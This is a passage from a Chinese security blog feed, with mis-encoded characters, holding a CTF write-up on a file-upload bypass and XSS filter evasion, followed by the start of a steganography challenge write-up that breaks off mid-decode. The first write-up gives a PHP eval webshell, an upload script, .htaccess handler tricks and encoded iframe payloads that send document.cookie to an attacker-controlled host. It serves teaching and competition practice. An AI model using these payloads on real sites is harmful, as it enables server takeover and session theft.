¹æ®æ–‡ä»¶åä¸­æœ€åä¸€ä¸ª <code>.</code> ä¹‹åçš„å­—ç¬¦å¾—åˆ°æ–‡ä»¶çš„æ‰©å±•åï¼Œå¦‚æœåŒ…å« <code>ph</code> çš„è¯å°±ä¼šè¢«æ‹¦ä½äº†ã€‚</p><p>å¦å¤–ï¼Œè§¦å‘ä¸Šä¼ çš„è¯éœ€è¦ç”¨ POST æ–¹æ³•ï¼Œä¸”åŒ…å«ä¸€ä¸ª <code>submit</code> å˜é‡ï¼Œå€¼çš„è¯éšæ„è®¾ç½®å°±å¥½äº†ã€‚</p><p>å…ˆå‡†å¤‡ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œå­˜ä¸º <code>miao.png</code>ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'miao'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span></code></pre><p>å½“ç„¶ POST ä¹Ÿè¡Œã€‚</p><p>Python å†™ä¸ªè„šæœ¬ä¸Šä¼ ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://45.76.221.54:8005/upload.php"</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'cookie'</span><span class="token punctuation">:</span> <span class="token string">'PHPSESSID=9f767556e4ef66825cb9e3b399e5d243'</span><span class="token punctuation">}</span>form_data <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'submit'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment"># 'upload': (f'.htaccess', open(f'.htaccess', 'rb'))</span>    <span class="token string">'upload'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'miao.png'</span></span><span class="token punctuation">,</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'miao.png'</span></span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>form_data<span class="token punctuation">)</span>resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> files<span class="token operator">=</span>form_data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>resp<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span><span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>content<span class="token punctuation">)</span></code></pre><p>ä¸Šä¼ ä¹‹åå‘ç°ä¸èƒ½æ‰§è¡Œ PHP è„šæœ¬ã€‚</p><p>åšçš„æ—¶å€™è¯•äº†è¯• <code>%00</code> æˆªæ–­ <code>test.php%00.png</code>ã€<code>1.php(0x00)/1.png</code> ä¹‹ç±»çš„ï¼Œå‘ç°éƒ½ä¸è¡Œã€‚</p><p>å†å›å»çœ‹çœ‹é¢˜ç›®ç¯å¢ƒï¼ŒPHP 7.4.0 + Apache 2.4.38ã€‚</p><p><img src="/2021/05/17/CTF_2021NUAACTF_EasyXSS/image-20210415011556612.png"></p><p>è€ƒè™‘åˆ°æœåŠ¡å™¨ç”¨äº† Apacheï¼Œå¯ä»¥è¯•è¯•ä¸Šä¼ ä¸€ä¸ª <code>.htaccess</code> æ–‡ä»¶ï¼Œè®©æ–‡ä»¶å¤¹é‡Œæ‰€æœ‰åç¼€çš„æ–‡ä»¶éƒ½äº¤ç»™ PHP æ¥å¤„ç†ã€‚</p><pre class="language-none"><code class="language-none">SetHandler application/x-httpd-php</code></pre><p>è¿™æ ·å°±èƒ½é€šè¿‡ä¸Šä¼ ä¸å¸¦æœ‰ <code>ph</code> åç¼€çš„æ–‡ä»¶æ¥æ‰§è¡Œ php ä»£ç äº†ã€‚</p><p>å½“ç„¶ä¹Ÿå¯ä»¥åœ¨ <code>.htaccess</code> é‡Œè¿™ä¹ˆå†™ï¼Œä¹Ÿå°±æ˜¯ç»™ <code>.png</code> æ–‡ä»¶æŒ‡å®šç”¨ PHP æ¥å¤„ç†ã€‚</p><pre class="language-none"><code class="language-none">AddType application/x-httpd-php .png</code></pre><p><img src="/2021/05/17/CTF_2021NUAACTF_EasyXSS/image-20210415184711330.png"></p><p>æ ¹æ®å¾—åˆ°çš„è·¯å¾„è¿›è¡Œè®¿é—®ï¼Œç„¶åç”¨ä¸€å¥è¯æœ¨é©¬å»æ‹¿ flagã€‚</p><p><img src="/2021/05/17/CTF_2021NUAACTF_EasyXSS/image-20210415175809073.png" alt="phpinfo"></p><p><img src="/2021/05/17/CTF_2021NUAACTF_EasyXSS/image-20210415180014335.png" alt="æ ¹ç›®å½•"></p><p><img src="/2021/05/17/CTF_2021NUAACTF_EasyXSS/image-20210415175945432.png" alt="flag"></p><p>æˆåŠŸæ‹¿åˆ° flagï¼Œå¥½è€¶ï¼</p><p><code>flag{851f398a-3db1-4299-8dd6-6a3d2467433f}</code></p><br><hr><br><h2 id="æ‹“å±•ä¸€ä¸‹"><a href="#æ‹“å±•ä¸€ä¸‹" class="headerlink" title="æ‹“å±•ä¸€ä¸‹"></a>æ‹“å±•ä¸€ä¸‹</h2><h3 id="çœ‹çœ‹æºç "><a href="#çœ‹çœ‹æºç " class="headerlink" title="çœ‹çœ‹æºç "></a>çœ‹çœ‹æºç </h3><p>é‚£é¡ºä¾¿å†æ¥çœ‹çœ‹ä»–æºç å¥½äº†ã€‚</p><p>å‘ç° <code>post.php</code> åœ¨æ¸²æŸ“é¡µé¢çš„æ—¶å€™ï¼Œæœ‰ä¸€ä¸ªè¿‡æ»¤ã€‚</p><p><img src="/2021/05/17/CTF_2021NUAACTF_EasyXSS/image-20210415190455945.png"></p><p>å…·ä½“æ˜¯</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render_tags</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/script|img|svg|on|document|window/i'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>é‚£å…¶å®è¿˜èƒ½ç›´æ¥ç”¨ <code>iframe</code> æ¥æ•´ï¼Œä¸è¿‡åŸç†å·®ä¸å¤šå€’æ˜¯äº†ã€‚</p><pre class="language-html" data-language="html"><code class="language-html">&lt;iframe src=javascript:alert('xss');&gt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span></code></pre><h3 id="æ”¹æ”¹è¿‡æ»¤"><a href="#æ”¹æ”¹è¿‡æ»¤" class="headerlink" title="æ”¹æ”¹è¿‡æ»¤"></a>æ”¹æ”¹è¿‡æ»¤</h3><p>æŠŠå…³é”®è¯æ›¿æ¢ä¸º <code>hacker</code> è¯•è¯•ï¼Œå³</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">render_tags</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/script|img|svg|on|document|window/i'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"hacker"</span> <span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>è¿™æ ·ä¸€ä¸‹å­éš¾åº¦å°±ä¸Šæ¥äº†ã€‚åŒ…å«è¿™äº›å…³é”®è¯çš„æ ‡ç­¾ä»¥åŠ <code>onxxxx</code> å±æ€§éƒ½ä¸èƒ½ç”¨äº†ã€‚</p><p>ï¼ˆ<del>å…¶å®è¿™é¢˜å‡ºé¢˜äººæœ€å¼€å§‹è¿‡æ»¤æ–¹æ³•å°±è¿™æ ·çš„ï¼Œåæ¥è§‰å¾—å¤ªéš¾äº†å°±æ”¹æˆæ›¿æ¢ä¸ºç©ºäº†ã€‚</del></p><p>ä½†æ˜¯è¿™æ ·è¿˜æœ‰ä¸ª <code>iframe</code> å¯ä»¥å†™å…¥ <code>src</code> å‘¢ã€‚</p><p>é¦–å…ˆæ„é€  payload</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">top<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'//VPSIP:PORT/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></code></pre><p>é…åˆ data åè®®ä»¥åŠ base64 ç¼–ç ï¼Œå†™å…¥åˆ° <code>src</code> é‡Œã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:text/html;base64,PHNjcmlwdD50b3AubG9jYXRpb24uaHJlZj0nLy9WUFNJUDpQT1JULycrZG9jdW1lbnQuY29va2llPC9zY3JpcHQ+<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span></code></pre><p>ç„¶è€Œæ‰“è¿‡å»å‘ç°è¢«æ‹¦ä½äº†â€¦â€¦</p><p><img src="/2021/05/17/CTF_2021NUAACTF_EasyXSS/image-20210415192435915.png"></p><p>ä¹Ÿå°±æ˜¯è¯´ data é‡Œä¸èƒ½æ‹¿åˆ° <code>document.cookie</code>ã€‚</p><p><strong>å†æ¥çœ‹ <code>iframe</code> æ ‡ç­¾è¿˜æœ‰ä»€ä¹ˆç¥å¥‡çš„å±æ€§å‘¢ï¼Ÿ</strong></p><p>å‚è€ƒ <a href="https://www.w3school.com.cn/tags/att_iframe_srcdoc.asp">HTML <code>&lt;iframe&gt;</code> æ ‡ç­¾çš„ srcdoc å±æ€§</a> ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ <code>srcdoc</code> å±æ€§ä¸­ç›´æ¥å†™å…¥ HTML æºç ã€‚</p><p>ä¸ºäº†é˜²æ­¢è¢«æ›¿æ¢æ‰ï¼Œè¿™é‡Œå¯ä»¥ç”¨ HTML entity ç¼–ç ä¸€ä¸‹ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token entity" title="<">&amp;#60;</span><span class="token entity" title="s">&amp;#115;</span><span class="token entity" title="c">&amp;#99;</span><span class="token entity" title="r">&amp;#114;</span><span class="token entity" title="i">&amp;#105;</span><span class="token entity" title="p">&amp;#112;</span><span class="token entity" title="t">&amp;#116;</span><span class="token entity" title=">">&amp;#62;</span><span class="token entity" title="t">&amp;#116;</span><span class="token entity" title="o">&amp;#111;</span><span class="token entity" title="p">&amp;#112;</span><span class="token entity" title=".">&amp;#46;</span><span class="token entity" title="l">&amp;#108;</span><span class="token entity" title="o">&amp;#111;</span><span class="token entity" title="c">&amp;#99;</span><span class="token entity" title="a">&amp;#97;</span><span class="token entity" title="t">&amp;#116;</span><span class="token entity" title="i">&amp;#105;</span><span class="token entity" title="o">&amp;#111;</span><span class="token entity" title="n">&amp;#110;</span><span class="token entity" title=".">&amp;#46;</span><span class="token entity" title="h">&amp;#104;</span><span class="token entity" title="r">&amp;#114;</span><span class="token entity" title="e">&amp;#101;</span><span class="token entity" title="f">&amp;#102;</span><span class="token entity" title="=">&amp;#61;</span><span class="token entity" title="'">&amp;#39;</span><span class="token entity" title="/">&amp;#47;</span><span class="token entity" title="/">&amp;#47;</span><span class="token entity" title="V">&amp;#86;</span><span class="token entity" title="P">&amp;#80;</span><span class="token entity" title="S">&amp;#83;</span><span class="token entity" title="I">&amp;#73;</span><span class="token entity" title="P">&amp;#80;</span><span class="token entity" title=":">&amp;#58;</span><span class="token entity" title="P">&amp;#80;</span><span class="token entity" title="O">&amp;#79;</span><span class="token entity" title="R">&amp;#82;</span><span class="token entity" title="T">&amp;#84;</span><span class="token entity" title="/">&amp;#47;</span><span class="token entity" title="'">&amp;#39;</span><span class="token entity" title="+">&amp;#43;</span><span class="token entity" title="d">&amp;#100;</span><span class="token entity" title="o">&amp;#111;</span><span class="token entity" title="c">&amp;#99;</span><span class="token entity" title="u">&amp;#117;</span><span class="token entity" title="m">&amp;#109;</span><span class="token entity" title="e">&amp;#101;</span><span class="token entity" title="n">&amp;#110;</span><span class="token entity" title="t">&amp;#116;</span><span class="token entity" title=".">&amp;#46;</span><span class="token entity" title="c">&amp;#99;</span><span class="token entity" title="o">&amp;#111;</span><span class="token entity" title="o">&amp;#111;</span><span class="token entity" title="k">&amp;#107;</span><span class="token entity" title="i">&amp;#105;</span><span class="token entity" title="e">&amp;#101;</span><span class="token entity" title="<">&amp;#60;</span><span class="token entity" title="/">&amp;#47;</span><span class="token entity" title="s">&amp;#115;</span><span class="token entity" title="c">&amp;#99;</span><span class="token entity" title="r">&amp;#114;</span><span class="token entity" title="i">&amp;#105;</span><span class="token entity" title="p">&amp;#112;</span><span class="token entity" title="t">&amp;#116;</span><span class="token entity" title=">">&amp;#62;</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span></code></pre><p>æ‰“è¿‡å»ï¼ŒæˆåŠŸæ”¶åˆ° cookieã€‚</p><p><img src="/2021/05/17/CTF_2021NUAACTF_EasyXSS/image-20210415195316877.png"></p><p>å¥½è€¶ï¼</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å¤ç°å®Œäº†è€¶ï¼</p><p>è¿™ç¯‡æ–‡ç« ä» NUAACTF 2021 Easy_XSS ä¸€é¢˜å…¥æ‰‹ï¼Œå¯¹æ•´ä¸ªè§£é¢˜è¿‡ç¨‹è¿›è¡Œäº†å¤ç°ã€‚</p><p>é¢˜ç›®è€ƒç‚¹ä¸»è¦åŒ…æ‹¬ XSS ç»•è¿‡ã€PHP ä»£ç å®¡è®¡ã€æ–‡ä»¶ä¸Šä¼ ç»•è¿‡ï¼Œæ€»ä½“è€Œè¨€éš¾åº¦è¿˜å¥½ã€‚</p><p>åœ¨æ‹“å±•éƒ¨åˆ†ï¼Œå¯¹äºè¿‡æ»¤æ›¿æ¢ä¸ºå…¶ä»–å­—ç¬¦çš„æƒ…å†µè¿›è¡Œäº†åˆ†æï¼Œè¿›ä¸€æ­¥è€ƒè™‘äº† <code>iframe</code> æ ‡ç­¾ä¸­çš„ <code>srcdoc</code> å±æ€§åœ¨ XSS ä¸­çš„åˆ©ç”¨ã€‚</p><h2 id="Extensive-Reading"><a href="#Extensive-Reading" class="headerlink" title="Extensive Reading"></a>Extensive Reading</h2><p><a href="https://www.anquanke.com/post/id/205098">.htaccessåˆ©ç”¨ä¸Bypassæ–¹å¼æ€»ç»“</a></p><p><a href="https://www.cnblogs.com/blacksunny/p/8001201.html">æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆç»•è¿‡å§¿åŠ¿ï¼‰</a></p><p><a href="https://xz.aliyun.com/t/4067">XSSæ€»ç»“</a></p><br><p><em>ï¼ˆæºœäº†æºœäº†å–µ~</em></p><!--<pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:text/html;base64,PHNjcmlwdD50b3AubG9jYXRpb24uaHJlZj0nLy80Ny45Ni4xNjQuMTU0OjcxODAvJytkb2N1bWVudC5jb29raWU8L3NjcmlwdD4=<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span></code></pre><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token entity" title="&#60;">&amp;#60;</span><span class="token entity" title="&#115;">&amp;#115;</span><span class="token entity" title="&#99;">&amp;#99;</span><span class="token entity" title="&#114;">&amp;#114;</span><span class="token entity" title="&#105;">&amp;#105;</span><span class="token entity" title="&#112;">&amp;#112;</span><span class="token entity" title="&#116;">&amp;#116;</span><span class="token entity" title="&#62;">&amp;#62;</span><span class="token entity" title="&#116;">&amp;#116;</span><span class="token entity" title="&#111;">&amp;#111;</span><span class="token entity" title="&#112;">&amp;#112;</span><span class="token entity" title="&#46;">&amp;#46;</span><span class="token entity" title="&#108;">&amp;#108;</span><span class="token entity" title="&#111;">&amp;#111;</span><span class="token entity" title="&#99;">&amp;#99;</span><span class="token entity" title="&#97;">&amp;#97;</span><span class="token entity" title="&#116;">&amp;#116;</span><span class="token entity" title="&#105;">&amp;#105;</span><span class="token entity" title="&#111;">&amp;#111;</span><span class="token entity" title="&#110;">&amp;#110;</span><span class="token entity" title="&#46;">&amp;#46;</span><span class="token entity" title="&#104;">&amp;#104;</span><span class="token entity" title="&#114;">&amp;#114;</span><span class="token entity" title="&#101;">&amp;#101;</span><span class="token entity" title="&#102;">&amp;#102;</span><span class="token entity" title="&#61;">&amp;#61;</span><span class="token entity" title="&#39;">&amp;#39;</span><span class="token entity" title="&#47;">&amp;#47;</span><span class="token entity" title="&#47;">&amp;#47;</span><span class="token entity" title="&#52;">&amp;#52;</span><span class="token entity" title="&#55;">&amp;#55;</span><span class="token entity" title="&#46;">&amp;#46;</span><span class="token entity" title="&#57;">&amp;#57;</span><span class="token entity" title="&#54;">&amp;#54;</span><span class="token entity" title="&#46;">&amp;#46;</span><span class="token entity" title="&#49;">&amp;#49;</span><span class="token entity" title="&#54;">&amp;#54;</span><span class="token entity" title="&#52;">&amp;#52;</span><span class="token entity" title="&#46;">&amp;#46;</span><span class="token entity" title="&#49;">&amp;#49;</span><span class="token entity" title="&#53;">&amp;#53;</span><span class="token entity" title="&#52;">&amp;#52;</span><span class="token entity" title="&#58;">&amp;#58;</span><span class="token entity" title="&#55;">&amp;#55;</span><span class="token entity" title="&#49;">&amp;#49;</span><span class="token entity" title="&#56;">&amp;#56;</span><span class="token entity" title="&#48;">&amp;#48;</span><span class="token entity" title="&#47;">&amp;#47;</span><span class="token entity" title="&#39;">&amp;#39;</span><span class="token entity" title="&#43;">&amp;#43;</span><span class="token entity" title="&#100;">&amp;#100;</span><span class="token entity" title="&#111;">&amp;#111;</span><span class="token entity" title="&#99;">&amp;#99;</span><span class="token entity" title="&#117;">&amp;#117;</span><span class="token entity" title="&#109;">&amp;#109;</span><span class="token entity" title="&#101;">&amp;#101;</span><span class="token entity" title="&#110;">&amp;#110;</span><span class="token entity" title="&#116;">&amp;#116;</span><span class="token entity" title="&#46;">&amp;#46;</span><span class="token entity" title="&#99;">&amp;#99;</span><span class="token entity" title="&#111;">&amp;#111;</span><span class="token entity" title="&#111;">&amp;#111;</span><span class="token entity" title="&#107;">&amp;#107;</span><span class="token entity" title="&#105;">&amp;#105;</span><span class="token entity" title="&#101;">&amp;#101;</span><span class="token entity" title="&#60;">&amp;#60;</span><span class="token entity" title="&#47;">&amp;#47;</span><span class="token entity" title="&#115;">&amp;#115;</span><span class="token entity" title="&#99;">&amp;#99;</span><span class="token entity" title="&#114;">&amp;#114;</span><span class="token entity" title="&#105;">&amp;#105;</span><span class="token entity" title="&#112;">&amp;#112;</span><span class="token entity" title="&#116;">&amp;#116;</span><span class="token entity" title="&#62;">&amp;#62;</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span></code></pre><p>â€“&gt;</p>-->]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 è“å¸½æ¯ Misc å†¬å¥¥ä¼š_is_coming WriteUp</title>
      <link href="2021/05/09/CTF_2021BlueHat/"/>
      <url>2021/05/09/CTF_2021BlueHat/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/09/CTF_2021BlueHat/image-20210509221228678.png"></p><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><blockquote><p><strong>ç¬¬äº”å±Šè“å¸½æ¯å…¨å›½å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›</strong></p><p>æ¯”èµ›æ—¶é—´: 2021-04-29 09:00 ~ 15:00</p><p>æ¯”èµ›å®˜ç½‘: <a href="https://bcs.qianxin.com/bluehatcup/index/index#/">https://bcs.qianxin.com/bluehatcup/index/index#/</a></p></blockquote><p>äº”ä¸€ä¹‹å‰æ‰“äº†ä¸ªè“å¸½æ¯ï¼Œè¿™é‡Œå°±æ‘¸é±¼éšæ„å†™ä¸€é“ Misc é¢˜ç›®çš„ WriteUp å¥½äº†ã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="å†¬å¥¥ä¼š-is-coming"><a href="#å†¬å¥¥ä¼š-is-coming" class="headerlink" title="å†¬å¥¥ä¼š_is_coming"></a>å†¬å¥¥ä¼š_is_coming</h3><p>æ‹¼æ¥éšå†™ï¼Œåˆ†ç¦»å‡ºä¸€ä¸ª rarã€‚</p><p><img src="/2021/05/09/CTF_2021BlueHat/image-20210429111257146.png"></p><p>å¤‡æ³¨æç¤ºå…«ä½æ•°ï¼Œè”ç³»é¢˜ç›®å†¬å¥¥ä¼šï¼Œåº”è¯¥æ˜¯ 2022 åŒ—äº¬å†¬å¥¥ä¼šå¼€å¹•çš„æ—¥å­å§ã€‚</p><p>ç”¨ MP3Stego è§£å¯†ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">MP3StegoDecode.exe -X encode.mp3 -P <span class="token number">20220204</span></code></pre><p>å¾—åˆ°</p><pre class="language-none"><code class="language-none">\xe2\x9c\x8c\xef\xb8\x8e \xe2\x98\x9d\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x98\x9f\xef\xb8\x8e\xe2\x97\x86\xef\xb8\x8e\xe2\x99\x8c\xef\xb8\x8e \xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x97\xbb\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xe2\x9d\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8e\xef\xb8\x8e \xf0\x9f\x93\x82\xef\xb8\x8e\xe2\x99\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xf0\x9f\x8f\xb1\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x93\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e \xe2\x9d\x96\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x91\xef\xb8\x8e\xf0\x9f\x93\xac\xef\xb8\x8e \xf0\x9f\x95\x88\xef\xb8\x8e\xe2\x99\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5\xe2\x99\x8f\xef\xb8\x8e \xe2\x99\x8b\xef\xb8\x8e \xe2\x97\x8f\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x8b\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x9c\x8d\xef\xb8\x8e</code></pre><p>æ‹¿ python è§£ç ä¸€ä¸‹ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">s<span class="token operator">=</span><span class="token string">b'\xe2\x9c\x8c\xef\xb8\x8e \xe2\x98\x9d\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x98\x9f\xef\xb8\x8e\xe2\x97\x86\xef\xb8\x8e\xe2\x99\x8c\xef\xb8\x8e \xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x97\xbb\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xe2\x9d\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8e\xef\xb8\x8e \xf0\x9f\x93\x82\xef\xb8\x8e\xe2\x99\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xf0\x9f\x8f\xb1\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x93\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e \xe2\x9d\x96\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x91\xef\xb8\x8e\xf0\x9f\x93\xac\xef\xb8\x8e \xf0\x9f\x95\x88\xef\xb8\x8e\xe2\x99\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5\xe2\x99\x8f\xef\xb8\x8e \xe2\x99\x8b\xef\xb8\x8e \xe2\x97\x8f\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x8b\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x9c\x8d\xef\xb8\x8e'</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># âœŒï¸ â˜ï¸â™“ï¸â§«ï¸â˜Ÿï¸â—†ï¸â™Œï¸ 